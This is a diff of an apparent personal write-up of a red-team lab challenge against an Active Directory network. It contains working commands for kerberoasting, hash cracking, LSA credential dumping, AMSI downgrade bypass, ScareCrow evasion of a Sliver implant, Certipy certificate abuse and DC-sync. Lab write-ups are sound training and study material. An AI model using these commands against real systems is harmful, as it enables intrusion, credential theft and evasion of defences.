@@ -494,12 +494,7 @@ This service was not exploitable for me.
 
 Sadly I got 193 error meaning that I could perform the path hijack and the `serviceName` service outputs error 5 meaning I needed administrator on the Box. This was a rabbit hole and enlightening of were my tactic struck against my objective.
 
-AD escalate and laterally move, before box escalation - Local Privilege Escalation takes longer.
-
-#### EDIT FROM HERE
-
-
-Some [seatbelt commmands](https://github.com/GhostPack/Seatbelt)
+AD escalate and laterally move, before box escalation - Local Privilege Escalation takes longer. But, I did give go test as to what is available in Sliver `armory` and C\# applications have been somewhat secondary to have less experience with C\# programming. The tooling in C\# is worth hassle of setup it takes to have these tools ready to go, but took me time. Here are some [seatbelt commmands](https://github.com/GhostPack/Seatbelt) from within sliver all undetected due to Sliver + ScareCrow combo
 ```go
 // 
 seatbelt -h 
@@ -517,26 +512,23 @@ seatbelt ScheduledTasks // None that run outside of System32
 seatbelt powershell // We can downgrade to bypass AMSI
 ```
 
-#### Just checking
 
+Just checking how `execute -o` is from interactive session and mainly how it handles quotes. 
 ![](wrk1system32icacls.png)
 
-#### What we can do
-
--  We can downgrade to bypass AMSI
+What we can do - We can downgrade to bypass AMSI if we wanted. I did not as I have done this bypass in the past.
 ![](wrk1powershelldowngradeasap.png)
 
-#### What we could consider
-
+What we could consider, if we were really wanting to escalate on this box. Again my expectations of the level of security mechanism on the network were much higher than they turned out to be. I suppose the point for businesses would be the configurations and tuning in testing employee Red and Blue Team skills.  
 -  Mimikatz no laps all bypassing WinDefend still required
 	- `seatbelt DpapiMasterKeys` - use `sekurla:dpapi` module
-- Python311
+- Python311 - is just weird.
 
 #### Seatbelt required: the Hound brings back the biscuits
 
 At this point I went over my Bloodhound information, then kerberoasted svc accounts.
 
-[Hashcat 13100](https://hashcat.net/wiki/doku.php?id=example_hashes) or krb5tgs with john
+[Hashcat 13100](https://hashcat.net/wiki/doku.php?id=example_hashes) or `krb5tgs` with john
 ```bash
 sudo apt install ntpdate
 sudo ntpdate $dc_ip
@@ -547,7 +539,7 @@ john corp.spns --format=krb5tgs --wordlist=~/RedTeamCapStoneChallenge/lists/mp32
 
 #### Return for Cthulu Cthursday
 
-Returning the day after because of work with [Al](https://www.twitch.tv/videos/1829218217), [Tyler Ramsbey Part 4](https://www.youtube.com/watch?v=qr8eGM1zhV8) and [Tyler Ramsbey Part 5](https://www.youtube.com/watch?v=FRUQMg9IhMA) in the background 
+Returning the day after because of work with [Al](https://www.twitch.tv/videos/1829218217), [Tyler Ramsbey Part 4](https://www.youtube.com/watch?v=qr8eGM1zhV8) and [Tyler Ramsbey Part 5](https://www.youtube.com/watch?v=FRUQMg9IhMA) in the background for while as I needed to reconsider how easy the network would be and with the limited time I had available to do this what I could accomplish.
 ```bash
 proxychains4 impacket-GetUserSPNs -dc-ip 10.200.116.02 -request 'corp.thereserve.loc/mohammad.ahmed' -outputfile krbs-2/corp.spns
 # Extract usernames
@@ -562,14 +554,14 @@ impacket-ticketConverter $ticket.ccache $ticket.kirbi
 export KRB5CCNAME=$(pwd)/$ticket.ccache
 ```
 
-My Bloodhound data was very different so I ran it again..but then we can psremote into server01!
+My Bloodhound data was very different so I ran it again..but then we can `psremote` into Server01!
 ![](wecanpsremoteintoserver1.png)
 
 ## Full Compromise of CORP Domain
 
-#### Return to take the next 17 flags!
+#### This DC-sync felt very good..
 
-Watching [Alh4zr3d](https://www.twitch.tv/videos/1829218217) Stream here and there.
+Watching [Alh4zr3d](https://www.twitch.tv/videos/1829218217) Stream here and there. 
 ```bash
 /opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain bing.com -obfu
 # Became:
@@ -586,10 +578,10 @@ I then tried kerberoasting from within my Beacon, which is just more awesomeness
 ![](sliverrubeuskerberoast.png)
 Also it supports RC4_HMAC so we can create Skeleton Keys like the mid 2010s APT. 
 
-And following back along with Al once re-re-re-re-hacked to the same point and improved my Sliver cheatsheet
+And following back along with Al once re-re-re-re-hacked to the same point and improved my Sliver cheatsheet.
 ![](svcScanningactuallypwned.png)
 
-[Alh4zr3d](https://www.twitch.tv/videos/1829218217) comes in with cme flags - Domain Cache Credentials - LSA are cached credentials stored in the registry. If 
+[Alh4zr3d](https://www.twitch.tv/videos/1829218217) comes in with cme flags - Domain Cache Credentials - LSA are cached credentials stored in the registry. 
 ```bash
 # You have local admin
 proxychains4 crackmapexec smb 10.200.116.31 -u 'svcScanning' -p 'Password1!' --lsa
@@ -785,6 +777,8 @@ We need login to the DC and dc-sync another DC as that looks normal!
 
 ## Full Compromise of Parent Domain
 
+#### AD CS exploitation 101 - was epic!
+
 Certipy - 101 with [Alh4zr3d](https://www.twitch.tv/videos/1829218217) - I used [Kali version - certifpy-ad](https://www.kali.org/tools/certipy-ad/)
 ```bash
 # This worked a week ago
@@ -794,7 +788,7 @@ proxychains4 certipy-ad find -u 'mohammad.ahmed@corp.thereserve.loc' -p 'Passwor
 ```
 I got this error
 ![](certipyerror.png)
-And with the pip3 version
+And with the `pip3` version
 ![](pip3versionofcertipy.png)
 
 Certificate Authority are setup to sign encryption, authentication, emails, TLS/SSL encrytion, governance and policy. PKI is Public Key infrastructure, Microsoft AD CS is the builtin PKI. Commonly used for generate SSL for internal certificates for internal websites.
@@ -833,8 +827,8 @@ proxychains4 certipy-ad auth -dc-ip 10.200.116.102 -ns 10.200.116.102 -pfx admin
 Because of PKInit you will receive the NTLM hashes from doing a S4U attack.
 ![](wowdchash.png)
 
-am03bam4n - Out of interest, have you exploited this AD CS issue when a DC does not have a DC Kerberos cert installed?
-SChannel is a created LDAP session with a certificate.
+am03bam4n - Out of interest, have you exploited this AD CS issue when a DC does not have a DC Kerberos cert installed? 
+- SChannel is a created LDAP session with a certificate.
 
 
 ```bash
@@ -863,7 +857,6 @@ impacket-smbserver share $(pwd) -smb2support
 xcopy \\10.50.113.184\Share\Word.exe .
 ```
 
-
 Possibly the most hacky bad sysadmin or red team reoccurring rake-to-facer  
 ```powershell
 # Creating the ultimate Domain Admin user so I will use a Sliver shell
@@ -886,6 +879,9 @@ gpupdate /force
 
 The horror...
 ![](powerlevelisover9000.png)
+
+## EDIT FROM HERE
+
 
 In the face BadOpsec of this I want to also make:
 - Silver Tickets
